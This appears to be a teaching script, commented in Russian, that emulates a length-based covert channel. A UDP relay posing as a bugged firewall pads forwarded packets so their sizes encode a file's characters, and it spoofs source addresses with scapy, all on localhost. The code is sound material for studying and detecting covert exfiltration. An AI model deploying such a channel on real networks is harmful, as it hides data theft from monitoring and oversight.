import socket
import time
import argparse
from random import randint as r
from scapy.all import *
from scapy.layers.inet import *

SERVER_ADDRESS = ('127.0.0.1', 2001)  # адрес сервера, куда посылаются сообщения
FIREWALL_ADDRESS = ('127.0.0.1', 2000)  # адрес средства защиты с закладкой
BUFFER = 30000  # размер буфера для приема
ALPHABET = 100  # Возьмем размер алфавита



def min_packet_len(max_len, letter):
    return (max_len // ALPHABET) * (ord(letter) - 30)


# прослушка и отправка сообщений
def listener(message):
    count = 0
    soc = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    soc.bind(FIREWALL_ADDRESS)
    while True:
        data, address = soc.recvfrom(BUFFER)
        if count == 0:
            max_len = get_max_len(data)
            soc.sendto(data, SERVER_ADDRESS)
            time.sleep(0.3)
            soc.sendto(data, SERVER_ADDRESS)  # ***
        elif count == 1:
            packet_creation(data + b'\x00' * (len(message) - data.count(b'\x00')), address)
            soc.sendto(data, SERVER_ADDRESS)  # ***
        elif count < len(message) + 2:
            min_pack_len = min_packet_len(max_len, message[count - 2])
            print(min_pack_len)
            buffer = len(data)
            if len(data) > min_pack_len:
                while buffer > 0:
                    try:
                        packet_creation(data_change(message[count - 2], data[:min_pack_len], max_len), address)
                        packet_creation(data_change(message[count - 2], data[:min_pack_len], max_len), address)  # ***
                        count += 1
                        buffer -= min_pack_len
                        min_pack_len = min_packet_len(max_len, message[count - 2])
                    except IndexError:
                        print('Сообщение отправлено')
                        packet_creation(data[min_pack_len:], address)
                        break
                try:
                    packet_creation(data_change(message[count - 2], data, max_len), address)
                    soc.sendto(data, SERVER_ADDRESS)  # ***
                    time.sleep(0.3)
                except IndexError:
                    print('Сообщение отправлено')
                    packet_creation(data[min_pack_len:], address)
            else:
                packet_creation(data_change(message[count - 2], data, max_len), address)
                soc.sendto(data, SERVER_ADDRESS)  # ***
                time.sleep(0.3)
        else:
            soc.sendto(data, SERVER_ADDRESS)
        time.sleep(0.3)
        count += 1


# получение максимальной длины из 1 сообщения
def get_max_len(data):
    print(f'Первый пакет получен, максимальная длина сообщения в битах: {len(data)}')
    return (len(data))


# функция получения нужных аргументов, как имя файла
def parse_arguments():
    parser = argparse.ArgumentParser(description='Covert channel emulation')
    parser.add_argument('filename', type=str, default='file.txt')
    return parser.parse_args()


# модификация сообщения
def data_change(char, data, max_len):
    number = ord(char) - 30  # порядковый номер элемента
    packet_len = (max_len // ALPHABET) * number + r(0, max_len // ALPHABET - 1)  # необходимая длина пакета
    byte_len = packet_len - (32 + len(data))  # длина заполнение нулями (32 - длина пакета udp)
    return (data + b'\x00' * byte_len)


# функция упаковки нового пакета с нужной длиной
def packet_creation(message, address):
    ip_header = IP(src=address[0], dst=SERVER_ADDRESS[0])
    udp_header = UDP(sport=address[1], dport=SERVER_ADDRESS[1])
    res_packet = ip_header / udp_header / Raw(message)
    send(res_packet)
    time.sleep(0.3)


if __name__ == '__main__':
    args = parse_arguments()
    file = open(args.filename)
    message = list(file.read())
    file.close()
    listener(message)
